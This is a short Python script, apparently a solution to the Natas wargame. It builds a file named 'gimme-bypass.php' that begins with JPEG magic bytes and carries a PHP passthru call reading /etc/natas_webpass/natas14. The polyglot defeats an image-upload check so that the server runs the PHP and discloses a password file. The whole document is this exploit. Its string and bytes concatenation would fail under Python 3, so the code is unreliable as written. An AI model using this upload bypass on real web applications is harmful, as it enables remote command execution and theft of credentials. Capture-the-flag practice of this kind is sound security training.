filey = open('gimme-bypass.php', 'w')
filey.write(b'\xFF\xD8\xFF\xFF\xD9' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>\n')
filey.close()
